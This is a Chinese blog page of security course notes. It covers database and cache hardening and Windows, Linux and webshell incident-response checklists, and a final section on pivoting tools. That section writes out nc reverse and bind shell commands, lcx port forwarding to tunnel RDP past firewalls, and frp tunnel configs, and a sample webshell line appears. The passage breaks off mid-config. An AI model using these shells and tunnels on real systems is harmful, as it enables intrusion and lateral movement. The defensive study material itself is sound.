<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232657593.png" alt="image-20220722232657593"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232707665.png" alt="image-20220722232707665"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232717725.png" alt="image-20220722232717725"></p>
<p>安装最新补丁<br>确保系统安装了最新的安全补丁。<br>注意:在保证业务及网络安全的前提下，并经过兼容性测试后，安装更新补丁。<br>如果不需要，应禁止远程访问<br>禁止网络连接，防止猜解密码攻击、溢出攻击、和嗅探攻击。<br>注意:仅限于应用和数据库在同一台主机的情况。<br>如果数据库不需要远程访问，可以禁止远程TCP/IP连接，通过在MySQL服务器的启动参数中添加–skip-networking参数使MySQL服务不监听任何TCP/IP连接，增加安全性。<br>您可以使用安全组进行内外网访问控制，建议不要将数据库高危服务对互联网开放。</p>
<p>设置可信IP访问控制<br>通过数据库所在操作系统的防火墙限制，实现只有信任的IP才能通过监听器访问数据库。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232838714.png" alt="image-20220722232838714"></p>
<p>连接数设置<br>根据您的机器性能和业务需求，设置最大、最小连接数。<br>在MySQL配置文件(my.conf或my.ini)的[mysqld]配置段中添加max_ connections = 1000，保存配置文件，重启MySQL服务后即可生效。</p>
<hr>
<p><strong>Memcached服务安全加固</strong><br>漏洞描述<br>Memcached是- -套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcached服务很容易被攻击者扫描<br>发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。</p>
<p>修复方案<br>●Memcached默认没有启用安全功能，建议用户在使用时进行安全加固。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233026904.png" alt="image-20220722233026904"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233043742.png" alt="image-20220722233043742"></p>
<hr>
<p><strong>Redis服务安全加固</strong><br>漏洞描述<br>●Redis因配置不当存在未授权访问漏洞，可以被攻击者恶意利用。<br>●在特定条件下，如果Redis以root身份运行，黑客可以给root账号写入SSH公钥文件，直接通过SSH登录受害服务器，从而获取<br>服务器权限和数据。一旦入侵成功，攻击者可直接添加账号用于SSH远程登录控制服务器，给用户的Redis运行环境以及Linux主<br>机带来安全风险，如删除、泄露或加密重要数据，引发勒索事件等。</p>
<p>●受影响范围<br>●在Redis客户端，尝试无账号登录Redis:</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233244650.png" alt="image-20220722233244650"></p>
<p>修复方案</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233310772.png" alt="image-20220722233310772"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233328583.png" alt="image-20220722233328583"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233347710.png" alt="image-20220722233347710"></p>
<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="Windows-应急"><a href="#Windows-应急" class="headerlink" title="Windows 应急"></a>Windows 应急</h2><p><strong>概述</strong></p>
<p>Q：什么是应急响应？<br>A：当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间<br>内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p>
<ol>
<li>IDS/IPS 告警</li>
<li>某些服务突然崩溃</li>
</ol>
<p>常见的应急响应事件分类：<br>web入侵：网页挂马、主页篡改、Webshell<br>系统入侵：病毒木马、勒索软件、远控后门<br>网络攻击：DDOS攻击、DNS劫持、ARP欺骗</p>
<hr>
<p><strong>常见排查思路</strong></p>
<p><strong>一、检查系统账号安全</strong></p>
<ol>
<li>查看服务器是否有弱口令，远程管理端口是否对公网开放。<br>检查方法：据实际情况咨询相关服务器管理员。(最直接有效)</li>
<li>查看服务器是否存在可疑账号、新增账号。<br>检查方法：</li>
</ol>
<p>​        1)对于低于win10版本的，打开 cmd 窗口，输入 lusrmgr.msc 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。</p>
<p>​        2)对于win10及win11可查看 “控制面板-&gt;用户账户”</p>
<ol start="3">
<li>查看服务器是否存在隐藏账号、克隆账号。<br>检查方法：</li>
</ol>
<p>​        1)打开注册表 ，查看管理员对应键值</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725211626893.png" alt="image-20220725211626893"></p>
<ol start="4">
<li>结合日志，查看管理员登录时间、用户名是否存在异常。<br>检查方法：</li>
</ol>
<p>​        1)Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p>
<p>​        2)导出Windows日志–安全（右键菜单-&gt;将所有事件另存为），利用Log Parser进行分析。<br><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725211819548.png" alt="image-20220725211819548"></p>
<p><strong>二、检查异常端口、进程</strong></p>
<ol>
<li>检查端口连接情况，是否有远程连接、可疑连接。<br>检查方法：</li>
</ol>
<p>​        1)netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED</p>
<p>​        2)根据netstat 定位出的pid，再通过tasklist命令进行进程定位 tasklist | findstr “PID”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725211902345.png" alt="image-20220725211902345"></p>
<p>2、排查可疑进程<br>检查方法：</p>
<ol>
<li>开始–运行–输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。</li>
<li>打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</li>
<li>通过微软官方提供的 Process Explorer 等工具进行排查 。</li>
<li>查看可疑的进程及其子进程。可以通过观察以下内容：<br> •没有签名验证信息的进程<br> •没有描述信息的进程<br> •进程的属主<br> •进程的路径是否合法<br> •CPU或内存资源占用长时间过高的进程</li>
</ol>
<p>3、小技巧：</p>
<ol>
<li>查看端口对应的PID： netstat -ano | findstr “port”</li>
<li>查看进程对应的PID：任务管理器–查看–选择列–PID 或者 tasklist | findstr “PID”</li>
<li>查看进程对应的程序位置：<br> •任务管理器–选择对应进程–右键打开文件位置<br> •运行输入 wmic，cmd界面 输入 process</li>
<li>tasklist /svc 进程–PID–服务</li>
<li>查看Windows服务所对应的端口： %system%/system32/drivers/etc/services（一般%system% 就是 C:\Windows）</li>
</ol>
<p><strong>三、检查启动项、计划任务、服务</strong></p>
<ol>
<li>检查服务器是否有异常的启动项。<br>检查方法：</li>
</ol>
<p>​        1)登录服务器，单击 “开始-&gt;所有程序-&gt;启动”，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</p>
<p>​        2)单击开始“菜单-&gt;运行”，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示            的路径删除文件。</p>
<p>​        3)单击“开始-&gt;运行”，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：<br>​            •HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run<br>​            •HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>​            •HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<br>​        检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p>
<p>​        4)利用安全软件查看启动项、开机时间管理等。</p>
<p>​        5)组策略，运行gpedit.msc，观察是否存在开关机时自运行的脚本。</p>
<ol start="2">
<li>检查计划任务<br>检查方法：</li>
</ol>
<p>​        1)单击“开始-&gt;设置-&gt;控制面板-&gt;任务计划”，查看计划任务属性，便可以发现木马文件的路径。</p>
<p>​        2)单击“开始-&gt;运行；输入 cmd，然后输入at（Win10后at命令已弃用，改用schtasks.exe），检查计算机与网络上的其它计算机之间            的会话或计划任务，如有，则确认是否为正常连接。</p>
<ol start="3">
<li>服务自启动<br>检查方法：单击“开始-&gt;运行”，输入services.msc，注意服务状态和启动类型，检查是否有异常服务。</li>
</ol>
<p><strong>四、检查系统相关信息</strong></p>
<ol>
<li>查看系统版本以及补丁信息<br>检查方法：单击“开始-&gt;运行”，输入systeminfo，查看系统信息</li>
</ol>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725212513068.png" alt="image-20220725212513068"></p>
<ol start="2">
<li>得到发现WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</li>
</ol>
<p>​        1)利用 Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。</p>
<p>​        2)利用计算机自带文件搜索功能，指定修改时间进行搜索。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725212551781.png" alt="image-20220725212551781"></p>
<ol start="3">
<li>查找可疑目录及文件<br>检查方法：</li>
</ol>
<p>​        1)查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。<br>​        Window 2003    C:\Documents and Settings<br>​        Window 2008R2     C:\Users\</p>
<p>​        2)单击“开始-&gt;运行”，输入%UserProfile%\Recent，分析最近打开分析可疑文件。</p>
<p>​        3)在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p>
<p>​        4)回收站、浏览器下载目录、浏览器历史记录中修改时间在创建时间之前的为可疑文件</p>
<p><strong>五、自动化查杀</strong></p>
<ol>
<li>病毒查杀<br> 检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li>
<li>webshell查杀<br> 检查方法：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充规则库的不足。</li>
</ol>
<h2 id="Linux-应急"><a href="#Linux-应急" class="headerlink" title="Linux 应急"></a>Linux 应急</h2><p><strong>常见排查思路</strong></p>
<p><strong>一、账号安全</strong><br>基本使用：</p>
<ol>
<li>/etc/passwd<br>用户名：口令：用户ID：组ID：用户说明：home目录：登陆之后shell<br>注意：无密码只允许本机登陆，远程不允许登陆</li>
</ol>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725212836369.png" alt="image-20220725212836369"></p>
<ol start="2">
<li>/etc/shadow<br> <code>root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</code><br> 用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</li>
</ol>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725213005759.png" alt="image-20220725213005759"></p>
<ol start="3">
<li>其他常用命令<br> who     查看当前登录用户（tty本地登陆 pts远程登录）<br> w    查看系统信息，想知道某一时刻用户的行为<br> uptime 查看登陆多久、多少用户，负载<br> 入侵排查：<br> 1)查询特权用户特权用户(uid 为0)<pre><code>     awk -F: &#39;$3==0&#123;print $1&#125;&#39; /etc/passwd
</code></pre>
 2)查询可以远程登录的帐号信息<pre><code>     awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow
</code></pre>
 3)除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限<pre><code>     more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;
</code></pre>
 4)禁用或删除多余及可疑的帐号<pre><code> usermod -L user     禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头
 userdel user    删除user用户
 userdel -r user     将删除user用户，并且将/home目录下的user目录一并删除
</code></pre>
</li>
</ol>
<p><strong>二、通过.bash_history查看帐号执行过的系统命令</strong><br>1、root的历史命令<br>histroy<br>2、打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令，并为历史的命令增加登录的IP地址、执行命令时间等信息：<br>    1）保存1万条命令<br>        sed -i ‘s/^HISTSIZE=1000/HISTSIZE=10000/g’ /etc/profile<br>    2）在/etc/profile的文件尾部添加如下行数配置信息：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###### history #########</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">USER</span></span><br><span class="line"><span class="built_in"></span>_</span><br><span class="line"><span class="attribute">IP</span>=`who -u am i 2&gt;/dev/<span class="literal">null</span> | awk <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span> | sed -e <span class="string">&#x27;s/[()]//g&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$USER</span></span></span><br><span class="line"><span class="string">_</span></span><br><span class="line"><span class="string">IP&quot;</span> = <span class="string">&quot;&quot;</span> ]</span><br><span class="line">then<span class="built_in"></span></span><br><span class="line"><span class="built_in">USER</span></span><br><span class="line"><span class="built_in"></span>_</span><br><span class="line"><span class="attribute">IP</span>=`hostname`</span><br><span class="line">fi</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">HISTTIMEFORMAT</span>=<span class="string">&quot;%F %T <span class="variable">$USER_IP</span> `whoami` &quot;</span></span><br><span class="line">shopt -s histappend</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PROMPT_COMMAND</span>=<span class="string">&quot;history -a&quot;</span></span><br><span class="line"><span class="comment">######### history ##########</span></span><br></pre></td></tr></table></figure>

<p>​    3）source /etc/profile 让配置生效<br>​    生成效果： 1 2018-07-10 19:45:39 192.168.204.1 root source /etc/profile<br>3、历史操作命令的清除：history -c</p>
<p><strong>三、检查异常端口</strong></p>
<ol>
<li><p>使用netstat 网络连接命令，分析可疑端口、IP、PID</p>
<pre><code>   `netstat -antlp|more`
</code></pre>
</li>
<li><p>查看pid所对应的进程文件路径，<br> <code>ls -l /proc/$PID/exe</code>      或     <code>file /proc/$PID/exe</code>（$PID 为对应的pid 号）</p>
</li>
</ol>
<p><strong>四、检查异常进程</strong></p>
<p>使用ps命令，分析进程            <code>ps aux | grep pid</code></p>
<p><strong>五、检查开机启动项</strong><br>基本使用：<br>Linux系统运行级别：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725213857913.png" alt="image-20220725213857913"></p>
<p>查看运行级别命令 runlevel</p>
<p>系统默认允许级别<br><code>vi /etc/inittab</code><br><code>id=3：initdefault </code>系统开机后直接进入哪个运行级别<br>开机启动配置文件<br><code>/etc/rc.local</code><br><code>/etc/rc.d/rc[0~6].d</code><br>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在<code>/etc/init.d</code>目录下，然后在<code>/etc/rc.d/rc*.d</code>中建立软链接即可        <code>ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code><br>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。<br>入侵排查：<br>启动项文件： <code>more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l</code><br><code>/etc/rc.d/rc3.d/</code></p>
<p><strong>六、检查定时任务</strong><br>基本使用<br>1、利用crontab创建计划任务<br>基本命令<br><code>crontab -l</code> 列出某个用户cron服务的详细内容<br>Tips：默认编写的crontab文件会保存在 (<code>/var/spool/cron/</code>用户名 例如: <code>/var/spool/cron/root</code>)<br><code>crontab -r</code> 删除每个用户cront任务(谨慎：删除所有的计划任务)<br><code>crontab -e </code>使用编辑器编辑当前的crontab文件<br>如：<code>/1 * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt</code> 每分钟写入文件<br>2、利用anacron实现异步定时任务调度<br>使用案例<br>每天运行 <code>/home/backup.sh</code> 脚本：<br><code>vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh</code><br>当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</p>
<p>对定时任务的排查：<br>重点关注以下目录中是否存在恶意脚本<br><code>/var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/*</code><br>小技巧：<br><code>more /etc/cron.daily/* </code>查看目录下所有文件</p>
<p><strong>七、检查是否存在正常业务之外的服务</strong><br>服务自启动的修改方法：<br>第一种修改方法：<br><code>chkconfig [--level 运行级别] [独立服务名] [on|off]</code><br><code>chkconfig –level 2345 httpd on</code> 开启自启动<br><code>chkconfig httpd on</code> （默认level是2345）<br>第二种修改方法：<br>修改<code> /etc/re.d/rc.local</code> 文件<br>加入 <code>/etc/init.d/httpd start</code><br>第三种修改方法：<br>使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务。</p>
<p><strong>入侵排查</strong><br>1、查询已安装的服务：<br>RPM包安装的服务<br><code>chkconfig --list</code> 查看服务自启动状态，可以看到所有的RPM包安装的服务<br><code>ps aux | grep crond</code> 查看当前服务<br>系统在3与5级别下的启动项<br>中文环境<br><code>chkconfig --list | grep &quot;3:启用\|5:启用&quot;</code><br>英文环境<br><code>chkconfig --list | grep &quot;3:on\|5:on&quot;</code><br>源码包安装的服务<br>查看服务安装位置 ，一般是在<code>/usr/local/</code><br>搜索<code>/etc/rc.d/init.d/ </code>查看是否存在开机自启动的服务</p>
<p><strong>八、检查异常文件</strong><br>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性<br>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？<br>可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件<br>3、针对可疑文件可以使用stat进行创建修改时间。</p>
<h2 id="WebShell-应急"><a href="#WebShell-应急" class="headerlink" title="WebShell 应急"></a>WebShell 应急</h2><p><strong>常见的WebShell查杀工具</strong></p>
<p><strong>D盾_Web查杀</strong><br>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为。<br>兼容性：只提供Windows版本。<br>工具下载地址：<a target="_blank" rel="noopener" href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725214656225.png" alt="image-20220725214656225"></p>
<p><strong>百度WEBDIR+</strong><br>下一代WebShell检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。<br>兼容性：提供在线查杀木马，免费开放API支持批量检测。<br>在线查杀地址：<a target="_blank" rel="noopener" href="https://scanner.baidu.com/">https://scanner.baidu.com/</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725214727303.png" alt="image-20220725214727303"></p>
<p><strong>河马</strong><br>专注webshell查杀研究，拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎<br>的查杀技术。查杀速度快、精度高、误报低。<br>兼容性：支持Windows、linux，支持在线查杀。<br>官方网站：<a target="_blank" rel="noopener" href="https://www.shellpub.com/">https://www.shellpub.com/</a>        <a target="_blank" rel="noopener" href="https://n.shellpub.com/">https://n.shellpub.com/</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725214755414.png" alt="image-20220725214755414"></p>
<p><strong>Web Shell Detector</strong><br>Webshell Detector具有“ Webshell”签名数据库，可帮助识别高达99％的 Webshell 。<br>兼容性：提供php/python脚本，可跨平台，在线检测。<br>官方网站：<a target="_blank" rel="noopener" href="http://www.shelldetector.com/">http://www.shelldetector.com/</a><br>github项目地址：<a target="_blank" rel="noopener" href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725214840659.png" alt="image-20220725214840659"></p>
<hr>
<p><strong>如何在百万行代码里发现隐藏的后门</strong></p>
<p>即使是一款拥有99.9%的Webshell检出率的检测引擎，依然可能存在Webshell绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽SEO手法，也很难通过手动检测或工具检测全部识别出来。面对一个大中型的应用系统，数以百万级的代码行，也是不可能做到每个文件每段代码进行手工检查的。最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。</p>
<p><strong>文件MD5校验</strong><br>下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里，除了有一个exe可执行文件，还有一个文件md5值。这个是软件作者在发布软件时，通过md5算法计算出该exe文件的“特征值”。<br>下载地址：<a target="_blank" rel="noopener" href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a><br><code>文件MD5：29285decadbce3918a4f8429ec33df46 WebShellKill.exe</code><br>当用户下载软件时，可以使用相同的校验算法计算下载到exe文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的exe文件是正确的。如果两个特征值不同，则认为下载到exe文件是被篡改过的。那同理可得，我们可以将所有网站文件计算一次hash值保存，当出现应急情况时，重新计算一次hash值，并与上次保存的hash值进行对比，从而输出新创建的、修改过及删除的文件列表。</p>
<p><strong>diff命令</strong><br>在linux中，我们经常使用diff来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。<br><code>diff -c -a -r [备份文件目录] [当前网站目录]</code><br>如下图所示，前三行列出了两个要对比的文件目录的差异，可以发现low.php文件被篡改过，篡改的内容是<code>@eval($_POST[&#39;g&#39;]);</code>。<br>ps：如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725215300340.png" alt="image-20220725215300340"></p>
<p><strong>版本控制工具</strong><br>版本控制工具，比如说git，重新上传代码到git，add+commit+push，然后打开项目，点击commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。另外，也可以通过git diff 用来比较文件之间的不同。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725215326416.png" alt="image-20220725215326416"></p>
<h2 id="常见代理软件"><a href="#常见代理软件" class="headerlink" title="常见代理软件"></a>常见代理软件</h2><p><strong>LCX</strong><br>lcx.exe是一个端口转发工具，有Windows版和Linux版两个版本，Windows版是lcx.exe,Linux版为portmap，<br>Windows版使用方法如下：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725215424509.png" alt="image-20220725215424509"></p>
<p>lcx 有两大功能：<br>1）端口转发(listen和slave成对使用)<br>2）端口映射(tran)</p>
<p><strong>一、lcx 内网端口转发</strong><br>1.内网主机上执行：<br><code>lcx.exe –slave 公网主机ip 公网主机端口 内网主机ip 内网主机端口</code><br>例如：<br><code>lcx.exe -slave 公网主机ip 4444 127.0.0.1 3389</code><br>意思是把内网主机的 3389 端口转发到具有公网ip主机的 4444 端口<br>2.公网主机上执行<br><code>lcx.exe –listen 公网主机端口1 公网主机端口2</code><br>例如：<br><code>lcx.exe –listen 4444 5555</code><br>意思是监听公网主机本机的 4444 端口请求，并将来自 4444 端口的请求传送给 5555 端口。</p>
<p>此时，RDP 连接，Windows 命令行下输入mstsc，即可打开远程桌面连接:</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725215603509.png" alt="image-20220725215603509"></p>
<p>如果是在公网主机上操作，计算机那栏只需要输入 127.0.0.1:5555，即可；如果是在本地主机上操作，则输入 公网主机ip:5555 ，然后输入用户名和密码，即可连接到内网主机。</p>
<p><strong>二、本地端口转发</strong><br>由于防火墙限制，部分端口如3389无法通过防火墙，此时可以将该目标主机的3389端口透传到防火墙允许的其他端口，如53端口。<br>目标主机上执行：<br><code>lcx -tran 53 目标主机ip 3389</code><br>这时我们可以直接远程桌面连接到到 目标主机IP:53    注：软件可能会被杀软查杀，可自行寻找免杀版本。</p>
<p>Linux版使用方法：<br>例如：<br>先在具有公网ip的主机上执行：<br><code>./portmap -m 2 -p1 6666 -h2 公网主机ip -p2 7777</code><br>意思是监听来自6666端口的请求，将其转发到7777端口;    再在内网主机上执行：<br><code>./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网主机ip -p2 6666</code><br>意思就是将内网主机22端口的流量转发到公网主机的6666端口。<br>然后在Linux系统命令行下执行<br><code>ssh 公网主机ip 7777</code><br>即可连接内网主机。</p>
<hr>
<p><strong>nc 反弹</strong><br>反向连接<br>在公网主机上进行监听：<br><code>nc -lvp 4444</code><br>在内网主机上执行：<br><code>nc -t -e cmd.exe 公网主机ip 4444</code><br>上述命令中 -t 参数是指通过telnet模式执行cmd.exe，可省略。成功后即可得到一个内网主机的cmd shell。</p>
<p>正向连接<br>远程主机上执行：<br><code>nc -l -p 4444 -t -e cmd.exe</code><br>本地主机上执行：<br><code>nc -vv 远程主机ip 4444</code><br>成功后，本地主机就获得了远程主机的一个cmd shell。</p>
<hr>
<p><strong>frp 内网穿透利器</strong><br>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。<br>工具地址： <a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a><br>frp 的作用<br>利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。</p>
<p>frp Windows平台文件目录如下：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725220020332.png" alt="image-20220725220020332"></p>
<p>其中frpc.ini和frpc_full.ini都为客户端配置文件，其中frpc_full.ini包括所有配置信息，我们可参考它来修改frpc.ini文件作为我们的配置文件，同理，frps.ini为服务器端配置文件。</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">服务端配置</span><br><span class="line"><span class="comment">#frps.ini</span></span><br><span class="line">[common]</span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">vhost_http_port</span> = <span class="number">80</span></span><br><span class="line"><span class="attr">vhost_https_port</span> = <span class="number">443</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="attr">dashboard_user</span> = &#123;username&#125;</span><br><span class="line"><span class="attr">dashboard_pwd</span> = &#123;password&#125;</span><br><span class="line"><span class="attr">privilege_mode</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">privilege_token</span> = &#123;privilege_token&#125;</span><br><span class="line"></span><br><span class="line">[http]</span><br><span class="line"><span class="attr">type</span> = http</span><br><span class="line"><span class="attr">auth_token</span> = &#123;auth_token&#125;</span><br><span class="line"><span class="attr">custom_domains</span> = &#123;cudtom_domains&#125;</span><br><span class="line">[https]</span><br><span class="line"><span class="attr">type</span> = https</span><br><span class="line"><span class="attr">auth_token</span> = &#123;auth_token&#125;</span><br><span class="line"><span class="attr">custom_domains</span> = &#123;custom_domains&#125;</span><br><span class="line">启动frp服务器端：</span><br><span class="line"></span><br><span class="line">frps.exe -c frps.ini</span><br><span class="line">浏览器访问： <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">7500</span>，输入frps.ini中配置的用户名和密码即可进入控制面板。</span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">客户端配置</span><br><span class="line"><span class="comment">#frpc.ini</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = xxx</span><br><span class="line">server_port = 7000</span><br><span class="line">auth_token = &#123;auth_token&#125;</span><br><span class="line">privilege_token = &#123;privilege_token&#125;</span><br><span class="line">[http]</span><br><span class="line">type = http</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 80</span><br><span class="line">[https]</span><br><span class="line">type = https</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 